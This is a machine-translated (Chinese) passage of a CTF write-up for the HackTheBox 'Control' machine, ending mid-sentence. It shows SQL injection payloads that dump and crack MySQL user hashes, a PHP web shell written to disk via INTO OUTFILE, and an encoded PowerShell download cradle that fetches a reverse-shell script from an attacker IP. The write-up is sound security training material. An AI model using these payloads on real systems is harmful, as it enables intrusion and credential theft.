<html>
<head>
<title>HacktheBox — Control</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客框—控件</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-control-51eac2b08a5a?source=collection_archive---------0-----------------------#2020-04-25">https://infosecwriteups.com/hackthebox-control-51eac2b08a5a?source=collection_archive---------0-----------------------#2020-04-25</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/a735a8003e21ad804ea74270c83af002.png" data-original-src="https://miro.medium.com/v2/resize:fit:1306/format:webp/1*TpOlfRd7NuV6R94P-Nd-OA.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://www.hackthebox.eu/home/machines/profile/218" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/218</a></figcaption></figure><h2 id="c5ae" class="jz ka iq bd kb kc kd dn ke kf kg dp kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">TL；博士:</h2><p id="17ae" class="pw-post-body-paragraph kv kw iq kx b ky kz la lb lc ld le lf ki lg lh li km lj lk ll kq lm ln lo lp ij bi translated">Control是一台Windows机器，它允许您使用基本的SQL注入和一点PowerShell。这是一个有趣的盒子，在没有SMB服务运行的情况下教你Windows概念。它从使用X-Forwarder-For标头可访问的管理页面开始。对页面的访问允许使用SQLi，它为您提供了初始访问权限。根部分基本上是不安全的ACL，它允许您编辑服务的ImagePath以产生恶意进程。</p><h2 id="a027" class="jz ka iq bd kb kc kd dn ke kf kg dp kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">扫描:</h2><p id="b6d9" class="pw-post-body-paragraph kv kw iq kx b ky kz la lb lc ld le lf ki lg lh li km lj lk ll kq lm ln lo lp ij bi translated">像往常一样，我运行我的初始nmap扫描:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="5b45" class="jz ka iq lv b gy lz ma l mb mc"># nmap -sV -sC -oA nmap/initial -vvv -n 10.10.10.167</span></pre><p id="01c9" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">结果是:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mi"><img src="../Images/d3b2d42d8f827869f62797b70e571fdd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HVb5gP1s5MYMdO57sYtqfg.png"/></div></div></figure><p id="86c0" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">开放端口为80运行IIS 10.0，135运行RPC，3306运行MySQL。这是非常不同的，因为我期待MSSQL在机器上运行，而不是MySQL，因为这是一台Windows机器。还提到我的IP (10.10.14.7)不允许连接这个MariaDB服务器。</p><p id="495a" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我还运行了TCP所有端口扫描:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="7278" class="jz ka iq lv b gy lz ma l mb mc"># nmap -p- -oA nmap/allports-tcp 10.10.10.167 -vvv -n</span></pre><p id="f3cd" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">结果是:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mn"><img src="../Images/2e5d8e165ebc25c7e0fdf0d479498d88.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cVfcSh9M2ZT5pZ5gqoZTLA.png"/></div></div></figure><p id="c19c" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">没什么有趣的。如果我没记错的话，新发现的端口通常是Windows RPC和NBT-NS使用的端口，所以没有什么可利用的。</p><h2 id="2381" class="jz ka iq bd kb kc kd dn ke kf kg dp kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">端口80</h2><p id="c5b2" class="pw-post-body-paragraph kv kw iq kx b ky kz la lb lc ld le lf ki lg lh li km lj lk ll kq lm ln lo lp ij bi translated">访问端口80:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mo"><img src="../Images/26926f396136d75120b51446e8b9a639.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QC9ZcvrdZXoyc33mFoMYHg.png"/></div></div></figure><p id="2a4c" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">检查关于:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mp"><img src="../Images/81526808d763a90d553f63837fd5ceae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HT8NYtxDUak6wfbNZhjjiw.png"/></div></div></figure><p id="f686" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">检查管理员:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mq"><img src="../Images/098094c0d90e41a1dc04f1003b653338.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qdmay9ia_T8dxsIIS72uRQ.png"/></div></div></figure><p id="ce22" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我还运行了Gobuster:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="f5a8" class="jz ka iq lv b gy lz ma l mb mc">gobuster dir -u <a class="ae jy" href="http://10.10.10.167" rel="noopener ugc nofollow" target="_blank">http://10.10.10.167</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobust[200/200]<br/>ut -x php</span></pre><p id="53e4" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">输出是:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/caab319ac0194293dfb857fc68f86f69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1326/format:webp/1*fLzIAq7f2xCVhXNnU8a3zQ.png"/></div></figure><p id="524d" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">值得注意的是，有一个shell.php文件，我不确定它是否是盒子的一部分，或者有人在我解决这个问题时也在解决这个问题(我后来找到了答案)。</p><p id="8a5d" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">查看index.php的源代码:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/ef042843b3aa075af932f252e1090bab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LMChwPCHlE-nDDgjtWW42A.png"/></div></figure><p id="06a5" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">它提到了一个待办事项列表。这里重要的是，它提到证书位于IP 192.168.4.28的共享“myfiles”中。我知道有一条消息说报头丢失了，为了使用代理，我最初想到它需要我用包含该IP的报头访问admin.php页面。</p><h2 id="3baf" class="jz ka iq bd kb kc kd dn ke kf kg dp kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">x-转发给:</h2><p id="0648" class="pw-post-body-paragraph kv kw iq kx b ky kz la lb lc ld le lf ki lg lh li km lj lk ll kq lm ln lo lp ij bi translated">为了满足我们的要求，我们可以使用X-Forwarded For头。来自<a class="ae jy" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For" rel="noopener ugc nofollow" target="_blank">https://developer . Mozilla . org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For</a>:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/472ecfff1fe10f13778fda27d2670750.png" data-original-src="https://miro.medium.com/v2/resize:fit:1366/format:webp/1*nIeRazJ1W7WD9jZ9XUMtKw.png"/></div></figure><p id="a7af" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">因此，如果我们在报头中包含“X-Forwarded For: 192.168.4.28”，控制机器将认为请求来自该IP，只是经过我们。我的机器就像一个代理。使用它会导致不同的管理页面:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/21d6d7d9f59900fe7cc68c091cdc7120.png" data-original-src="https://miro.medium.com/v2/resize:fit:1202/format:webp/1*rMNHSEl2gIODZztAf00Khg.png"/></div></figure><p id="7753" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我现在可以访问管理页面了:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mv"><img src="../Images/673734377b486eb6957827a135f99c94.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IqP8J7WjaQe3-cZlMLhgxw.png"/></div></div></figure><p id="aa0f" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">现在知道它包含产品的搜索功能，我测试了它是否容易受到SQL注入(SQLi)的攻击:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mw"><img src="../Images/c35a606abe98973220268d834114d619.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RIbpGMQ0PGrmf1yHteNQzw.png"/></div></div></figure><p id="f5e3" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">结果导致语法错误，这也泄露了MariaDB服务器正在运行:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mx"><img src="../Images/6b74502f2f726a7488aefe6d1ac88e0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yZxypvfm1vgyqyOc5cQXFg.png"/></div></div></figure><p id="9264" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">知道这容易受到SQLi的攻击，我测试了各种有效负载来识别运行在后面的查询。我首先尝试了联合注射:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="dc4e" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,2,3; -- -</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi my"><img src="../Images/3d289c6202ea0998182fad8dc66d3c63.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XIlHWOE058HKP2SnU4VzRA.png"/></div></div></figure><p id="9604" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">在这些情况下，您只需枚举查询中使用了多少列，因为UNION运算符要求两端具有相同的列。猜测之后，如果我选择6列，响应会有所不同:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="eaf9" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,2,3,4,5,6; -- -</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mz"><img src="../Images/e6637d130d3108fad81a1d65a2dce632.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hEhJEerxyZQxUTIx5TdunQ.png"/></div></div></figure><p id="273e" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">知道我猜到了正确的列数，我就可以使用SQL查询来代替列数。</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="1dc0" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,2,3, version(),5,6; -- -</span></pre><p id="e218" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">它现在泄漏的是数据库版本，而不是数字“4”:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi na"><img src="../Images/877261b4a502ba76a9a1749f2b215ab1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DplsX484_qSsdp2mn0PkRQ.png"/></div></div></figure><p id="7283" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我还可以在我们的上下文中检查当前用户:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="ffd7" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,2,3, user(),5,6; -- -</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nb"><img src="../Images/23caff4ffa797a9e0eaa5fc4d4f0dcbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ujU6Bj_QrFigTz3F1UwGSw.png"/></div></div></figure><p id="5b97" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">正在检查当前数据库:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="fa8e" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,2,3, database(),5,6; -- -</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nc"><img src="../Images/a7fc5542ae81199728ef35638a1e4930.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aG03zFgVarRPJH2LhPzACw.png"/></div></div></figure><p id="dc6b" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">在转储数据库之前，最好尝试映射您是哪个用户以及您在哪个数据库中。我知道列出可用的数据库:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="f273" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata; -- -</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nd"><img src="../Images/4d03550b703ce5e8584d4dc047f66df9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6uCUp7nlvsdk1VEruxM9Ig.png"/></div></div></figure><p id="b75c" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">知道没有其他感兴趣的数据库，我尝试获取表“user”下的列</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="90cf" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='user'; -- -</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ne"><img src="../Images/5924e8ebeedac9612043d65486a50717.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*upJxaR4OWodnSkKSitsmng.png"/></div></div></figure><p id="31ef" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">然后，我现在从DB mysql的表user中检索列user和passwords。</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="c7b6" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,user,password,4,5,6 from mysql.user; -- -</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nf"><img src="../Images/d0c941d994e10a8e43c21a0eabab3474.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Clg2Aw73GmKzy9Cg_PK44A.png"/></div></div></figure><p id="35d4" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">知道我有用户名和散列，我可以尝试使用Hashcat来破解它们。通过检查散列的长度，似乎它们是40个字符，所以很可能它们是SHA-1散列或某种形式的MySQL散列。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ng"><img src="../Images/145712ad89329058a99821607e107b2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9PhoMAdnrUT4KIn8Tpxm4w.png"/></div></div></figure><p id="5894" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">然后，我检查了SHA1的相应模式，并试图用SHA1破解，但它不会破解。然后我寻找MySQL的散列:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nh"><img src="../Images/d3199be0319eff4dc30592bfa39bca76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fi4FlTgP2pv35yWT9snnWg.png"/></div></div></figure><p id="fb4e" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">似乎模式300满足了我们的字符长度，试图破解它:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="50a9" class="jz ka iq lv b gy lz ma l mb mc">.\hashcat64.exe -m 300 control-hashes.txt rockyou.txt</span></pre><p id="d7ab" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">它能够破解其中一个哈希:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/3fbd599daf97f10003933e3514c8f57d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*Rmdq9IM4A23R2eqEHpRc4Q.png"/></div></figure><p id="b2f6" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我还把哈希发送到了Crackstation，这是一个在线密码哈希破解程序。只有在为CTFs破解密码时，才使用在线平台，而不是在实际工作中！我这样做是因为这只是一个CTF。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nj"><img src="../Images/5b21aa83bd48c6b738b04c6c80d72396.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NHN00J3igSeIQh3LINw8Dg.png"/></div></div></figure><p id="12d1" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">2/3的密码被破解的用户经理和赫克托。</p><h2 id="f579" class="jz ka iq bd kb kc kd dn ke kf kg dp kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">立足点:</h2><p id="cb36" class="pw-post-body-paragraph kv kw iq kx b ky kz la lb lc ld le lf ki lg lh li km lj lk ll kq lm ln lo lp ij bi translated">然后，我尝试连接到MariaDB端口，但是我的IP不被允许，从初始nmap扫描也可以看出这一点。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nk"><img src="../Images/c4fc42343a1a61a541b6bceda38d2cee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FM8Qnmz21Rh-VC1_JKRi-w.png"/></div></div></figure><p id="7ee8" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">接下来要做的是尝试使用SQL注入得到一个shell。由于这是一台IIS服务器，web根目录的默认位置是C:\inetpub\wwwroot。从我的Gobuster扫描中知道有一个uploads目录，我可以猜测uploads目录在C:\inetpub\wwwroot\uploads。然后，我尝试使用INTO OUTFILE在磁盘上写文件。还知道web服务器使用PHP运行，我使用一个简单的web shell和系统函数。</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="f1f3" class="jz ka iq lv b gy lz ma l mb mc">1' UNION SELECT 1,2,3,4,5,'&lt;?php system($_GET["cmd"]); ?&gt;' into outfile 'c:/inetpub/wwwroot/uploads/sifo.php' ;  -- -</span></pre><p id="de75" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">现在，当我访问该页面时，我可以验证文件是否上传到了/uploads目录:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/93f30cdfb03d0d3ec4f90480aa730655.png" data-original-src="https://miro.medium.com/v2/resize:fit:1148/format:webp/1*JEkR0EcUZAwyVuIMXPIgDw.png"/></div></figure><p id="94f0" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我现在可以使用“cmd”参数运行命令了:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/fd152f028dec92c94221b4f03354fe90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1224/format:webp/1*haKx5YAlM0LhLrvPpudLTA.png"/></div></figure><p id="d672" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我现在可以将它发送给Burp，这样我就可以使用更长的命令了。然后我使用了来自Nishang的Powershell反向shell，Invoke-PowerShellTcp.ps1脚本:<a class="ae jy" href="https://github.com/samratashok/nishang" rel="noopener ugc nofollow" target="_blank">https://github.com/samratashok/nishang</a></p><p id="c1a7" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我将著名的IEX摇篮下载转换为UTF16-le，如果我没记错的话，Powershell与Bash有不同的编码，并将其编码为base64，以避免通过网络发送它时出现任何问题，然后使用Powershell的flag-encoded命令运行它。</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="2394" class="jz ka iq lv b gy lz ma l mb mc">PS C:\ echo -n "IEX(new-object net.webclient).downloadString('<a class="ae jy" href="http://10.10.14.7/a.ps1'" rel="noopener ugc nofollow" target="_blank">http://10.10.14.7/a.ps1'</a>)" | iconv -t utf-16le |base64 -w 0</span></pre><p id="7952" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">发送到打嗝:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/19111860bb14512c4db98c41f4148d21.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*W0LLePTaOFGWI0wO2vesLw.png"/></div></figure><p id="a014" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">上面的脚本是这样的:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="c1e6" class="jz ka iq lv b gy lz ma l mb mc">powershell.exe -exec bypass -enc "SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdAB"</span></pre><p id="f906" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我的python HTTP服务器上没有任何点击。我试着用最简单的形式发送摇篮:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi no"><img src="../Images/eaad56bbf79192ef8575c560d77a32ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9yn2aoIR6p9L1S7VCfHRWg.png"/></div></div></figure><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi np"><img src="../Images/1806bc15d815da9191f92f52c88b908a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2mNu_b-acwRKB1tWb051Jw.png"/></div></div></figure><p id="290f" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我得到了点击率，但没有连接到我的听众。然后，我尝试使用机器上的wget下载netcat二进制文件:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/d726b4e617f0b3b33f8dd4a8f1d46a51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*theKYsFgKgXyJGk6PpyhmQ.png"/></div></figure><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/567c05b7f836e8fa0c7ca3eaa1e4e8e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1288/format:webp/1*ft32YVMUyINQGa1AvDbuFg.png"/></div></figure><p id="59f4" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">知道netcat下载了，我查了一下目录有没有保存。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ns"><img src="../Images/6c8781c359ebdae4f5933f200f81f9e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3eaf9ZAZZ3xeU2evSdqZjg.png"/></div></div></figure><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/445be9333de3c73a23ad2a978945b580.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/1*xFlUJlAs-HQ4K6wf7-gFOw.png"/></div></figure><p id="7654" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我知道得到一个贝壳:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/fa09e7d3cc1a8119b4ff94587a9d77aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1082/format:webp/1*Y-R6-qMjjTas6OZMfNDiQg.png"/></div></figure><h2 id="25d9" class="jz ka iq bd kb kc kd dn ke kf kg dp kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">用户权限:</h2><p id="5444" class="pw-post-body-paragraph kv kw iq kx b ky kz la lb lc ld le lf ki lg lh li km lj lk ll kq lm ln lo lp ij bi translated">我对X-Forwarded-For旁路是如何工作的很感兴趣，所以我查看了admin.php的文件:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nv"><img src="../Images/7824243adb1ca0ac1e4259ecc14f6940.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gZiWI18EiqT7IwYD3lbJ_Q.png"/></div></div></figure><p id="c317" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">然后我检查监听端口，发现端口5985用于WinRM。它在0.0.0.0上侦听，但我的初始扫描没有找到它。扫描它还提到它是过滤过的。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/7fdf069bee980f1d58c3da9027a2160e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1250/format:webp/1*RZOcj_5dHKM77Q_v0hWkxA.png"/></div></figure><p id="7786" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">知道我有凭证后，我也在RPC上试了一下，但是不起作用。由于WinRM正在侦听，我可以尝试使用凭据连接到它。WinRM类似于SSH，但工作方式完全不同。我首先生成一个带有旁路策略“执行”的PowerShell进程，并创建一个安全字符串，因为WinRM只允许对安全字符串进行身份验证。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/7a5905e013772b3f55125009e089acf9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*Lhbvchrd7SLr-eSMKw6EMQ.png"/></div></figure><p id="4d2c" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我还创建了一个PS凭证对象(要求您指明计算机名\用户和安全字符串):</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ny"><img src="../Images/fada207de9893940aa6ae2cc8bc1a702.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1Q1nKWF9wm2mBc_er8Pqkg.png"/></div></div></figure><p id="4057" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh 